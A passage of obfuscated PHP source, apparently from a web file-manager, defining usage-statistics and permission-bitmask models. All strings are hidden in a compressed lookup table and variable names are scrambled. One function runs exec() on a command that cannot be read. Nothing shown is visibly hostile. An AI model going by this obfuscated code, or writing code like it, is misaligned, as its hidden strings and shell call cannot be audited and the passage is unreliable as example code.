$_SERVER[‚ûòÉ˜ş]; if ($Íšªù›Á == $Ö¶Íñ¾´[12]) { return $GLOBALS[$Ö¶Íñ¾´[6]][$Ö¶Íñ¾´[433]]; } } } class SystemRecordModel extends ModelBaseLight { } goto F‡Ğ¡Ùé‰˜; dªÂÍ‚‡õ: define($_SERVER[‚ûòÉ˜ş][0], $_SERVER[‚ûòÉ˜ş][1]); $_SERVER[ĞÅóÜØğ] = explode($_SERVER[‚ûòÉ˜ş][2], gzinflate(substr($_SERVER[‚ûòÉ˜ş][3], 10, -8))); function binCheckEq($³¤å›òË, $ú¾‹€çö) { return $³¤å›òË == $ú¾‹€çö; } goto d¡â¯›÷; d»ùƒ¿‘«®: class AnalysisModel extends ModelBaseLight { public function init($ûÚé™ûÅ) { $­ªÉ˜îÏ =& $_SERVER[‚ûòÉ˜ş]; $‘Ç™ÜÁê = array($­ªÉ˜îÏ[638] => array($­ªÉ˜îÏ[43] => $­ªÉ˜îÏ[1814], $­ªÉ˜îÏ[326] => array($­ªÉ˜îÏ[249], $­ªÉ˜îÏ[805], $­ªÉ˜îÏ[1815], $­ªÉ˜îÏ[1816])), $­ªÉ˜îÏ[1817] => array($­ªÉ˜îÏ[43] => $­ªÉ˜îÏ[1818], $­ªÉ˜îÏ[326] => array($­ªÉ˜îÏ[249], $­ªÉ˜îÏ[803], $­ªÉ˜îÏ[1819], $­ªÉ˜îÏ[1820], $­ªÉ˜îÏ[1821]))); if (!isset($‘Ç™ÜÁê[$ûÚé™ûÅ])) { return !1; } $this->optionType = $‘Ç™ÜÁê[$ûÚé™ûÅ][$­ªÉ˜îÏ[43]]; $this->field = $‘Ç™ÜÁê[$ûÚé™ûÅ][$­ªÉ˜îÏ[326]]; return !0; } public function listData($³¯¹¡¼ = false, $ÒÇÓ’”Ù = "\x6d\x6f\x64\151\x66\x79\x54\x69\155\x65", $ÄàÌ£ÓŸ = false) { return parent::listData($³¯¹¡¼, $ÒÇÓ’”Ù, $ÄàÌ£ÓŸ); } public function trendList($Çğ¯…“Â) { $ »Å×» =& $_SERVER[‚ûòÉ˜ş]; $êôªƒÕ“ = $this->listData(); if ($êôªƒÕ“) { $°Û‚„é° = end($êôªƒÕ“); $’¨·ÙĞÀ = date($ »Å×»[1822], strtotime($ »Å×»[1823])); if ($°Û‚„é°[$ »Å×»[249]] == $’¨·ÙĞÀ) { return $êôªƒÕ“; } $ïÈ•¥ê‰ = strtotime($°Û‚„é°[$ »Å×»[249]]); } if (!isset($ïÈ•¥ê‰)) { $ÖÄ„ƒ”é = $Çğ¯…“Â == $ »Å×»[638] ? $ »Å×»[575] : $ »Å×»[865]; $ïÈ•¥ê‰ = Model($ÖÄ„ƒ”é)->min($ »Å×»[225]); } $¢Æ­­šç = $ »Å×»[1824] . ucfirst($Çğ¯…“Â); $ĞË—Ì = $this->dateList($ïÈ•¥ê‰); foreach ($ĞË—Ì as $’¨·ÙĞÀ) { $this->{$¢Æ­­šç}($’¨·ÙĞÀ); } return $this->listData(); } private function dateList($«Úöƒ) { $İè ˜Î =& $_SERVER[‚ûòÉ˜ş]; $‚İÑÜÉå = $«Úöƒ; $²šÎÀåë = strtotime($İè ˜Î[1823]); $ÂİÍùÔØ = array(); while ($‚İÑÜÉå <= $²šÎÀåë) { $ÂİÍùÔØ[] = date($İè ˜Î[1822], $‚İÑÜÉå); $‚İÑÜÉå = strtotime($İè ˜Î[1825], $‚İÑÜÉå); } return $ÂİÍùÔØ; } public function _recordUser($„»•Åœû = '') { $¡§¾ÄãÓ =& $_SERVER[‚ûòÉ˜ş]; $õê™ĞÔç = strtotime(date($¡§¾ÄãÓ[1826], strtotime($„»•Åœû))); $¾î±ĞÍ = strtotime(date($¡§¾ÄãÓ[1827], strtotime($„»•Åœû))); $ŒíüŸç½ = array($¡§¾ÄãÓ[225] => array($¡§¾ÄãÓ[1054], $¾î±ĞÍ)); $¯ÌùË˜¤ = Model($¡§¾ÄãÓ[575])->where($ŒíüŸç½)->count($¡§¾ÄãÓ[1687]); $ŒíüŸç½[$¡§¾ÄãÓ[225]] = array($¡§¾ÄãÓ[386], array($õê™ĞÔç, $¾î±ĞÍ)); $œÀİ®ˆÓ = Model($¡§¾ÄãÓ[575])->where($ŒíüŸç½)->count($¡§¾ÄãÓ[1687]); $ŒíüŸç½[$¡§¾ÄãÓ[43]] = $¡§¾ÄãÓ[1828]; $û‡‰ÇÖ‡ = Model($¡§¾ÄãÓ[1829])->where($ŒíüŸç½)->count($¡§¾ÄãÓ[1830]); $Ó·ÇµÖ› = array($¡§¾ÄãÓ[249] => $„»•Åœû, $¡§¾ÄãÓ[805] => (int) $¯ÌùË˜¤, $¡§¾ÄãÓ[1815] => (int) $œÀİ®ˆÓ, $¡§¾ÄãÓ[1816] => (int) $û‡‰ÇÖ‡); return $this->insert($Ó·ÇµÖ›); } public function _recordStore($èÚû…õÊ = '') { $‰ùøâ¿À =& $_SERVER[‚ûòÉ˜ş]; $Ÿú¾–šå = strtotime(date($‰ùøâ¿À[1827], strtotime($èÚû…õÊ))); $Ïï„¹¶Å = array($‰ùøâ¿À[225] => array($‰ùøâ¿À[1054], $Ÿú¾–šå)); $‹ÂšØğë = Model($‰ùøâ¿À[520])->where($Ïï„¹¶Å)->sum($‰ùøâ¿À[86]); $Ïï„¹¶Å[$‰ùøâ¿À[461]] = 0; $½¼ÕƒÈ¥ = Model($‰ùøâ¿À[865])->where($Ïï„¹¶Å)->sum($‰ùøâ¿À[86]); $Ïï„¹¶Å[$‰ùøâ¿À[188]] = 1; $´§ µİĞ = Model($‰ùøâ¿À[865])->where($Ïï„¹¶Å)->sum($‰ùøâ¿À[86]); $Ïï„¹¶Å[$‰ùøâ¿À[188]] = 2; $ÚÊå¨ˆ› = Model($‰ùøâ¿À[865])->where($Ïï„¹¶Å)->sum($‰ùøâ¿À[86]); $È§‘¤ÎÌ = array($‰ùøâ¿À[249] => $èÚû…õÊ, $‰ùøâ¿À[803] => (int) $½¼ÕƒÈ¥, $‰ùøâ¿À[1819] => (int) $‹ÂšØğë, $‰ùøâ¿À[1820] => (int) $´§ µİĞ, $‰ùøâ¿À[1821] => (int) $ÚÊå¨ˆ›); return $this->insert($È§‘¤ÎÌ); } public function trend($ıÃáşÎö, $¤‰²¡ƒ) { $ù¯Å¾Ã· =& $_SERVER[‚ûòÉ˜ş]; if (!$this->init($ıÃáşÎö)) { return !1; } $ÍÉ¡ó”­ = $this->trendList($ıÃáşÎö); if ($ÍÉ¡ó”­ && $¤‰²¡ƒ != $ù¯Å¾Ã·[1660]) { $éßÚòûÛ = $ÍÉ¡ó”­[0][$ù¯Å¾Ã·[249]]; $»õÙ¹Íß = $this->validDate($¤‰²¡ƒ, $éßÚòûÛ); $÷³Ìàû = array(); $Á¹ ã¦‰ = array_to_keyvalue($ÍÉ¡ó”­, $ù¯Å¾Ã·[249]); foreach ($»õÙ¹Íß as $âß£ÄÅ…) { if (isset($Á¹ ã¦‰[$âß£ÄÅ…])) { $€Ãïê¿ = $Á¹ ã¦‰[$âß£ÄÅ…]; } else { $€Ãïê¿ = end($ÍÉ¡ó”­); $€Ãïê¿[$ù¯Å¾Ã·[249]] = $âß£ÄÅ…; if ($ıÃáşÎö == $ù¯Å¾Ã·[638]) { $€Ãïê¿[$ù¯Å¾Ã·[1815]] = $€Ãïê¿[$ù¯Å¾Ã·[1816]] = 0; } } $÷³Ìàû[] = $€Ãïê¿; } $ÍÉ¡ó”­ = $÷³Ìàû; } $ñíÏù™Â = array($ù¯Å¾Ã·[638] => array($ù¯Å¾Ã·[805] => LNG($ù¯Å¾Ã·[1831]), $ù¯Å¾Ã·[1815] => LNG($ù¯Å¾Ã·[1832]), $ù¯Å¾Ã·[1816] => LNG($ù¯Å¾Ã·[1833])), $ù¯Å¾Ã·[1817] => array($ù¯Å¾Ã·[803] => LNG($ù¯Å¾Ã·[1834]), $ù¯Å¾Ã·[1819] => LNG($ù¯Å¾Ã·[1835]), $ù¯Å¾Ã·[1820] => LNG($ù¯Å¾Ã·[1836]), $ù¯Å¾Ã·[1821] => LNG($ù¯Å¾Ã·[1837]))); $›˜…åÏ = array($ù¯Å¾Ã·[638] => $ù¯Å¾Ã·[1838], $ù¯Å¾Ã·[1817] => $ù¯Å¾Ã·[86]); if (empty($ÍÉ¡ó”­)) { $âß£ÄÅ… = date($ù¯Å¾Ã·[1822], strtotime($ù¯Å¾Ã·[1823])); $°„½•çù = array($ù¯Å¾Ã·[249] => $âß£ÄÅ…); foreach ($ñíÏù™Â[$ıÃáşÎö] as $ì˜ÏëÂß => $®Íô‡ù») { $°„½•çù[$ì˜ÏëÂß] = 0; } $ÍÉ¡ó”­[] = $°„½•çù; } $óæÖÓë = array(); foreach ($ÍÉ¡ó”­ as $®Íô‡ù») { if ($ıÃáşÎö == $ù¯Å¾Ã·[1817] && $®Íô‡ù»[$ù¯Å¾Ã·[1819]] > $®Íô‡ù»[$ù¯Å¾Ã·[803]]) { $®Íô‡ù»[$ù¯Å¾Ã·[1819]] = $®Íô‡ù»[$ù¯Å¾Ã·[803]]; } foreach ($ñíÏù™Â[$ıÃáşÎö] as $ì˜ÏëÂß => $ß›ëó€¡) { $€Ãïê¿ = array($ù¯Å¾Ã·[249] => $®Íô‡ù»[$ù¯Å¾Ã·[249]], $ù¯Å¾Ã·[1584] => $ß›ëó€¡); $€Ãïê¿[$›˜…åÏ[$ıÃáşÎö]] = isset($®Íô‡ù»[$ì˜ÏëÂß]) ? $®Íô‡ù»[$ì˜ÏëÂß] : 0; $óæÖÓë[] = $€Ãïê¿; } } return $óæÖÓë; } public function validDate($‹÷ôÔşƒ, $ôùà£Ÿê) { $şÕ´ƒÒ˜ =& $_SERVER[‚ûòÉ˜ş]; $¦×½’€ = date($şÕ´ƒÒ˜[1822], strtotime($şÕ´ƒÒ˜[1823])); $æıÔÆ® = array($¦×½’€); switch ($‹÷ôÔşƒ) { case $şÕ´ƒÒ˜[1667]: $‚™ÄĞô = mktime(0, 0, 0, date($şÕ´ƒÒ˜[1839]), date($şÕ´ƒÒ˜[1401]) - date($şÕ´ƒÒ˜[1464]) + 7 - 7, date($şÕ´ƒÒ˜[1840])); $”Ã¯ç¶Ó = 0; do { $ÒŸÔâ¸œ = date($şÕ´ƒÒ˜[1822], $‚™ÄĞô - 3600 * 24 * 7 * $”Ã¯ç¶Ó); $æıÔÆ®[] = $ÒŸÔâ¸œ; $”Ã¯ç¶Ó++; } while ($ôùà£Ÿê < $ÒŸÔâ¸œ); break; case $şÕ´ƒÒ˜[1665]: $”Ã¯ç¶Ó = 1; do { $ŞÌÃÀ¸¬ = date($şÕ´ƒÒ˜[1841], strtotime("\x2d\40{$”Ã¯ç¶Ó}\x20\x6d\157\156\164\x68\163")); $æıÔÆ®[] = $ŞÌÃÀ¸¬; $”Ã¯ç¶Ó++; } while ($ôùà£Ÿê < $ŞÌÃÀ¸¬); break; case $şÕ´ƒÒ˜[1842]: $ä¿¶‚Õó = (int) date($şÕ´ƒÒ˜[1840], strtotime($ôùà£Ÿê)); $Šù×ñ¹™ = (int) date($şÕ´ƒÒ˜[1840]); if ($ä¿¶‚Õó >= $Šù×ñ¹™) { break; } for ($ä¿¶‚Õó; $ä¿¶‚Õó < $Šù×ñ¹™; $ä¿¶‚Õó++) { $æıÔÆ®[] = $ä¿¶‚Õó . $şÕ´ƒÒ˜[1843]; } break; default: break; } if ($ôùà£Ÿê > end($æıÔÆ®)) { array_pop($æıÔÆ®); } sort($æıÔÆ®); return $æıÔÆ®; } public function listTable($ÈİŞ§×à) { $îèšÆ© = ucfirst($ÈİŞ§×à); return Model($îèšÆ©)->listData(); } public function option($ÍÈÂÒáï) { $¹¤È™‡ì = $_SERVER[‚ûòÉ˜ş][1844] . ucfirst($ÍÈÂÒáï); return $this->{$¹¤È™‡ì}(); } private function optionUser() { $¢¾›¡Ú =& $_SERVER[‚ûòÉ˜ş]; $œä§Ğ—¹ = Model($¢¾›¡Ú[575])->count($¢¾›¡Ú[1687]); $ÅôÀ­À¾ = Model($¢¾›¡Ú[575])->where($¢¾›¡Ú[1845])->count($¢¾›¡Ú[1687]); $¡­•×„À = intval($GLOBALS[$¢¾›¡Ú[6]][$¢¾›¡Ú[402]][$¢¾›¡Ú[1639]]) / 3600; $ĞáºÀî = strtotime("\x2d{$¡­•×„À}\x20\150\157\x75\x72\x73"); $ÜÁ€ã¯  = strtotime(date($¢¾›¡Ú[1826])); if ($ĞáºÀî < $ÜÁ€ã¯ ) { $ĞáºÀî = $ÜÁ€ã¯ ; } $•ÖËÉ± = array($¢¾›¡Ú[1846] => array($¢¾›¡Ú[1055], $ĞáºÀî)); $ËÄ£ù½İ = (int) Model($¢¾›¡Ú[575])->where($•ÖËÉ±)->count($¢¾›¡Ú[1687]); if (!$ËÄ£ù½İ) { $ËÄ£ù½İ = 1; } $•ÖËÉ± = array($¢¾›¡Ú[1846] => array($¢¾›¡Ú[1055], $ÜÁ€ã¯ )); $˜à¢Ê¡Ä = Model($¢¾›¡Ú[575])->where($•ÖËÉ±)->count($¢¾›¡Ú[1687]); return array($¢¾›¡Ú[798] => (int) $œä§Ğ—¹, $¢¾›¡Ú[1847] => (int) ($œä§Ğ—¹ - $ÅôÀ­À¾), $¢¾›¡Ú[1848] => (int) $ÅôÀ­À¾, $¢¾›¡Ú[1849] => (int) $˜à¢Ê¡Ä, $¢¾›¡Ú[1850] => $ËÄ£ù½İ); } private function optionFile() { $†ı«¿Ş =& $_SERVER[‚ûòÉ˜ş]; $¤ÛîúÔ¼ = $this->sourceSize(); $ˆÓÔõÌš = $¤ÛîúÔ¼[$†ı«¿Ş[86]]; $Ş¡¥›…‚ = $¤ÛîúÔ¼[$†ı«¿Ş[1819]]; $Àä°†Å = Model($†ı«¿Ş[865])->where(array($†ı«¿Ş[461] => 0))->count($†ı«¿Ş[191]); $á‰±Æ = array($†ı«¿Ş[461] => 0, $†ı«¿Ş[225] => array($†ı«¿Ş[1055], strtotime(date($†ı«¿Ş[1826])))); $¯Áƒ‰Ô÷ = Model($†ı«¿Ş[865])->where($á‰±Æ)->sum($†ı«¿Ş[86]); $¹¦Ş ü = Model($†ı«¿Ş[865])->where($á‰±Æ)->count($†ı«¿Ş[191]); return array($†ı«¿Ş[803] => $ˆÓÔõÌš, $†ı«¿Ş[1819] => $Ş¡¥›…‚, $†ı«¿Ş[1851] => $ˆÓÔõÌš - $Ş¡¥›…‚, $†ı«¿Ş[1852] => (int) $¯Áƒ‰Ô÷, $†ı«¿Ş[805] => (int) $Àä°†Å, $†ı«¿Ş[1853] => (int) $¹¦Ş ü); } private function optionAccess() { $ÂÈº—ëÙ =& $_SERVER[‚ûòÉ˜ş]; return array($ÂÈº—ëÙ[798] => $this->typeLogCnt(), $ÂÈº—ëÙ[117] => $this->typeLogCnt($ÂÈº—ëÙ[117]), $ÂÈº—ëÙ[501] => $this->typeLogCnt($ÂÈº—ëÙ[501]), $ÂÈº—ëÙ[1854] => $this->typeLogCnt($ÂÈº—ëÙ[1854]), $ÂÈº—ëÙ[1855] => $this->typeLogCnt($ÂÈº—ëÙ[1855]), $ÂÈº—ëÙ[638] => $this->typeLogCnt($ÂÈº—ëÙ[12], $ÂÈº—ëÙ[1830])); } private function typeLogCnt($¥µ“¼Üñ = '', $ù÷·´°à = "\x69\144") { $™ÓÜ¯“ =& $_SERVER[‚ûòÉ˜ş]; $€üÛÑË = array($™ÓÜ¯“[117] => array($™ÓÜ¯“[1856], $™ÓÜ¯“[1857]), $™ÓÜ¯“[501] => array($™ÓÜ¯“[1858], $™ÓÜ¯“[1859]), $™ÓÜ¯“[1854] => array($™ÓÜ¯“[1860], $™ÓÜ¯“[1861], $™ÓÜ¯“[1862]), $™ÓÜ¯“[1855] => array($™ÓÜ¯“[1863], $™ÓÜ¯“[1864]), $™ÓÜ¯“[1865] => array($™ÓÜ¯“[1866], $™ÓÜ¯“[1867], $™ÓÜ¯“[1868])); $ªÎËŒÃã = strtotime(date($™ÓÜ¯“[1826])); $œ´‘õ§Û = array($™ÓÜ¯“[225] => array($™ÓÜ¯“[1055], $ªÎËŒÃã)); if ($¥µ“¼Üñ) { $œ´‘õ§Û[$™ÓÜ¯“[43]] = array($™ÓÜ¯“[7], $€üÛÑË[$¥µ“¼Üñ]); } $üı†Ä§ñ = Model($™ÓÜ¯“[1829])->where($œ´‘õ§Û)->count($ù÷·´°à); return (int) $üı†Ä§ñ; } private function optionServer() { $›Ú®á™ =& $_SERVER[‚ûòÉ˜ş]; $ïÔÇÄûß = $this->diskDriver(); $‡Ş—å“É = KodIO::defaultDriver(); $ßêñµå¸ = array($›Ú®á™[857] => $‡Ş—å“É[$›Ú®á™[451]]); $Ù–²Ì = Model($›Ú®á™[520])->where($ßêñµå¸)->sum($›Ú®á™[86]); $Ğı¶à = explode($›Ú®á™[63], $_SERVER[$›Ú®á™[154]]); $…¬ëÀì = $Ğı¶à[0]; $‡äó­ = $GLOBALS[$›Ú®á™[6]][$›Ú®á™[31]]; $œËŠ‘£Ë = $‡äó­[$›Ú®á™[1017]]; if ($œËŠ‘£Ë == $›Ú®á™[1005]) { $Ûœ÷´î¹ = explode($›Ú®á™[1323], $‡äó­[$›Ú®á™[1016]]); $œËŠ‘£Ë = $Ûœ÷´î¹[0]; } if ($œËŠ‘£Ë == $›Ú®á™[953] || $œËŠ‘£Ë == $›Ú®á™[844]) { $÷®õŸ•ñ = Model()->db()->query($›Ú®á™[1869]); $«˜ÚÓÇè = $÷®õŸ•ñ[0] && isset($÷®õŸ•ñ[0][$›Ú®á™[1583]]) ? $÷®õŸ•ñ[0][$›Ú®á™[1583]] : 0; $œËŠ‘£Ë = $›Ú®á™[1870] . ($«˜ÚÓÇè ? $›Ú®á™[8] . $«˜ÚÓÇè : $›Ú®á™[12]); } $¯ûÒÂ‡È = $GLOBALS[$›Ú®á™[6]][$›Ú®á™[402]][$›Ú®á™[867]]; return array($›Ú®á™[1871] => $ïÔÇÄûß ? $ïÔÇÄûß[$›Ú®á™[1872]] : 0, $›Ú®á™[1873] => $ïÔÇÄûß ? $ïÔÇÄûß[$›Ú®á™[1874]] : 0, $›Ú®á™[1875] => (int) $‡Ş—å“É[$›Ú®á™[1872]] * 1024 * 1024 * 1024, $›Ú®á™[1876] => (int) $Ù–²Ì, $›Ú®á™[1877] => ucfirst($…¬ëÀì), $›Ú®á™[1878] => $›Ú®á™[1879] . PHP_VERSION, $›Ú®á™[1880] => phpBuild64() ? 64 : 32, $›Ú®á™[797] => str_replace($›Ú®á™[1171], $›Ú®á™[1033], $œËŠ‘£Ë), $›Ú®á™[402] => ucfirst($¯ûÒÂ‡È), $›Ú®á™[42] => $_SERVER[$›Ú®á™[1881]]); } private function diskDriver() { $ ìòü =& $_SERVER[‚ûòÉ˜ş]; $òÇ²Ã¥ = $ ìòü[8]; $¬¤€÷ = $GLOBALS[$ ìòü[6]][$ ìòü[1340]] == $ ìòü[1341]; if ($¬¤€÷) { $òÇ²Ã¥ = $ ìòü[1882]; if (function_exists($ ìòü[1883])) { exec($ ìòü[1884], $©Ñˆª—ú); $òÇ²Ã¥ = $©Ñˆª—ú[1] . $ ìòü[8]; } } if (!file_exists($òÇ²Ã¥)) { return; } $µØé®Î† = @disk_total_space($òÇ²Ã¥); $ÉåÀÄ = $µØé®Î† - @disk_free_space($òÇ²Ã¥); return array($ ìòü[1872] => $µØé®Î†, $ ìòü[1874] => $ÉåÀÄ); } public function fileChart($öäÒı è) { $¡‘ÏèŠ¿ =& $_SERVER[‚ûòÉ˜ş]; if (isset($öäÒı è[$¡‘ÏèŠ¿[1687]])) { return Model($¡‘ÏèŠ¿[865])->userFileTypeProfile($öäÒı è[$¡‘ÏèŠ¿[1687]]); } if (isset($öäÒı è[$¡‘ÏèŠ¿[1885]])) { return Model($¡‘ÏèŠ¿[865])->groupFileTypeProfile($öäÒı è[$¡‘ÏèŠ¿[1885]]); } $Ú±Ûèî = $this->sourceSize(); $ŞÛ­ÛÈ± = array($¡‘ÏèŠ¿[190] => 0, $¡‘ÏèŠ¿[188] => 1); $Éô¯¿¢ = Model($¡‘ÏèŠ¿[865])->where($ŞÛ­ÛÈ±)->sum($¡‘ÏèŠ¿[86]); $ŞÛ­ÛÈ±[$¡‘ÏèŠ¿[188]] = 2; $‰õÛÅñı = Model($¡‘ÏèŠ¿[865])->where($ŞÛ­ÛÈ±)->sum($¡‘ÏèŠ¿[86]); return array($¡‘ÏèŠ¿[803] => $Ú±Ûèî[$¡‘ÏèŠ¿[86]], $¡‘ÏèŠ¿[1819] => $Ú±Ûèî[$¡‘ÏèŠ¿[1819]], $¡‘ÏèŠ¿[1820] => (int) $Éô¯¿¢, $¡‘ÏèŠ¿[1821] => (int) $‰õÛÅñı); } private function sourceSize() { $ç‹Á³Œ =& $_SERVER[‚ûòÉ˜ş]; $‰¼Ó­Ìé = Model($ç‹Á³Œ[865])->where(array($ç‹Á³Œ[461] => 0))->sum($ç‹Á³Œ[86]); $ëáœé£û = Model($ç‹Á³Œ[520])->sum($ç‹Á³Œ[86]); if ($ëáœé£û > $‰¼Ó­Ìé) { $ëáœé£û = $‰¼Ó­Ìé; } return array($ç‹Á³Œ[86] => (int) $‰¼Ó­Ìé, $ç‹Á³Œ[1819] => (int) $ëáœé£û); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $¢‰¸º† =& $_SERVER[‚ûòÉ˜ş]; $Ğ¡Êôƒ÷ = array(array($¢‰¸º†[470] => LNG($¢‰¸º†[1886]), $¢‰¸º†[1887] => $¢‰¸º†[1888], $¢‰¸º†[1889] => 1, $¢‰¸º†[1890] => 1, $¢‰¸º†[1891] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($¢‰¸º†[470] => LNG($¢‰¸º†[1892]), $¢‰¸º†[1887] => $¢‰¸º†[1893], $¢‰¸º†[1889] => 2, $¢‰¸º†[1890] => 1, $¢‰¸º†[1891] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($¢‰¸º†[470] => LNG($¢‰¸º†[1894]), $¢‰¸º†[1887] => $¢‰¸º†[1895], $¢‰¸º†[1889] => 3, $¢‰¸º†[1890] => 1, $¢‰¸º†[1891] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($¢‰¸º†[470] => LNG($¢‰¸º†[1896]), $¢‰¸º†[1887] => $¢‰¸º†[1897], $¢‰¸º†[1889] => 4, $¢‰¸º†[1890] => 1, $¢‰¸º†[1891] => self::AUTH_SHOW | self::AUTH_VIEW), array($¢‰¸º†[470] => LNG($¢‰¸º†[1898]), $¢‰¸º†[1887] => $¢‰¸º†[1899], $¢‰¸º†[1889] => 5, $¢‰¸º†[1890] => 1, $¢‰¸º†[1891] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($¢‰¸º†[470] => LNG($¢‰¸º†[1900]), $¢‰¸º†[1887] => $¢‰¸º†[1901], $¢‰¸º†[1889] => 6, $¢‰¸º†[1890] => 1, $¢‰¸º†[1891] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($¢‰¸º†[470] => LNG($¢‰¸º†[1902]), $¢‰¸º†[1887] => $¢‰¸º†[1903], $¢‰¸º†[1889] => 7, $¢‰¸º†[1890] => 1, $¢‰¸º†[1891] => 0)); return $Ğ¡Êôƒ÷; } public static function authCheck($ªÁÅë», $äÛŒ¨Ïû) { $Ü¥€¹ç³ =& $_SERVER[‚ûòÉ˜ş]; $ªÁÅë» = intval($ªÁÅë»); if ($GLOBALS[$Ü¥€¹ç³[544]] && $GLOBALS[$Ü¥€¹ç³[6]][$Ü¥€¹ç³[1904]]) { return !0; } if ($ªÁÅë» <= 0) { return !1; } if (($ªÁÅë» & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ªÁÅë» & $äÛŒ¨Ïû); } public static function authCheckShow($†ï—Íô†) { return self::authCheck($†ï—Íô†, self::AUTH_SHOW); } public static function authCheckView($µÜ’øªè) { return self::authCheck($µÜ’øªè, self::AUTH_VIEW); } public static function authCheckDownload($’¡ƒĞ™î) { return self::authCheck($’¡ƒĞ™î, self::AUTH_DOWNLOAD); } public static function authCheckUpload($¤ë®œ‘Æ) { return self::authCheck($¤ë®œ‘Æ, self::AUTH_UPLOAD); } public static function authCheckEdit($ğèĞÍ±¸) { return self::authCheck($ğèĞÍ±¸, self::AUTH_EDIT); } public static function authCheckRemove($ê‹¼òê˜) { return self::authCheck($ê‹¼òê˜, self::AUTH_REMOVE); } public static function authCheckShare($ôƒàùÂ¦) { return self::authCheck($ôƒàùÂ¦, self::AUTH_SHARE); } public static function authCheckComment($É·¢²„) { return self::authCheck($É·¢²„, self::AUTH_COMMENT); } public static function authCheckEvent($Æ¾¸ÅÈ½) { return self::authCheck($Æ¾¸ÅÈ½, self::AUTH_EVENT); } public static function authCheckRoot($Ë•ëÑ¼‡) { return self::authCheck($Ë•ëÑ¼‡, self::AUTH_ROOT); } public static function authCheckAction($¸òûêïâ, $ã„å¤) { $ŸæÙ´ôÄ =& $_SERVER[‚ûòÉ˜ş]; $åñµˆ…Š = array($ŸæÙ´ôÄ[1905] => self::AUTH_VIEW, $ŸæÙ´ôÄ[1235] => self::AUTH_DOWNLOAD, $ŸæÙ´ôÄ[117] => self::AUTH_UPLOAD, $ŸæÙ´ôÄ[1855] => self::AUTH_EDIT, $ŸæÙ´ôÄ[1854] => self::AUTH_REMOVE, $ŸæÙ´ôÄ[1865] => self::AUTH_SHARE, $ŸæÙ´ôÄ[407] => self::AUTH_COMMENT, $ŸæÙ´ôÄ[1675] => self::AUTH_EVENT, $ŸæÙ´ôÄ[1906] => self::AUTH_ROOT); if (!isset($åñµˆ…Š[$ã„å¤])) { return; } $ÀöÇŞ†É = $åñµˆ…Š[$ã„å¤]; $¸òûêïâ = intval($¸òûêïâ); if ($¸òûêïâ <= 0) { return !1; } if (($¸òûêïâ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($¸òûêïâ & $ÀöÇŞ†É); } public static function authDisable($…¾ÙèÏú, $ Æı›…è) { if (intval($…¾ÙèÏú) <= 0) { return 0; } return intval($…¾ÙèÏú) & ~$ Æı›…è; } public $optionType = "\x53\x79\163\164\x65\x6d\x2e\x73\x6f\x75\162\x63\x65\101\x75\x74\150\114\151\x73\164"; public $field = array("\156\x61\155\145", "\141\x75\164\150", "\154\141\x62\x65\154", "\144\x69\163\x70\154\x61\171", "\163\171\x73\x74\145\155", "\163\157\x72\164"); public function initData() { $Æ´á´×¬ = $this->authDefault(); foreach ($Æ´á´×¬ as $¹à›–“²) { $this->add($¹à›–“²); } } public function findAuth($âÕ‘À³, $²ÒŠ£ÂÏ) { $ÈÜîİ‚Ì =& $_SERVER[‚ûòÉ˜ş]; $ºØÑ¸ï© = parent::listData(); foreach ($ºØÑ¸ï© as $’¬í›µ) { $Ëˆ›‰ÏÇ = intval($’¬í›µ[$ÈÜîİ‚Ì[463]]); if ($Ëˆ›‰ÏÇ <= 0 || $’¬í›µ[$ÈÜîİ‚Ì[1907]] == 0) { continue; } if (($Ëˆ›‰ÏÇ & $âÕ‘À³) != $âÕ‘À³) { continue; } if (($Ëˆ›‰ÏÇ & $²ÒŠ£ÂÏ) != 0) { continue; } return $’¬í›µ[$ÈÜîİ‚Ì[451]]; } return !1; } public function findAuthReadOnly() { $ü“º ¨ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ø‘ƒ¼Éğ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ü“º ¨, $ø‘ƒ¼Éğ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $™·ÔøÎ =& $_SERVER[‚ûòÉ˜ş]; $¦Ğâ‡îú = parent::listData(); $•äì™• = !1; foreach ($¦Ğâ‡îú as $õ˜¯‡¹Ş) { if ($õ˜¯‡¹Ş[$™·ÔøÎ[463]] <= 0 || $õ˜¯‡¹Ş[$™·ÔøÎ[1907]] == $™·ÔøÎ[222]) { continue; } if (!$•äì™•) { $•äì™• = $õ˜¯‡¹Ş; continue; } if ($•äì™•[$™·ÔøÎ[463]] > $õ˜¯‡¹Ş[$™·ÔøÎ[463]]) { $•äì™• = $õ˜¯‡¹Ş; } } return $•äì™• ? $•äì™•[$™·ÔøÎ[451]] : $™·ÔøÎ[12]; } public function listData($ãêšò = false, $İ¦îúª‰ = "\x73\157\x72\x74", $à†ÎÉÈÔ = false) { return parent::listData($ãêšò, $İ¦îúª‰, $à†ÎÉÈÔ); } public function update($†ğŸ¾ä, $÷¥ÒĞ´Ë) { 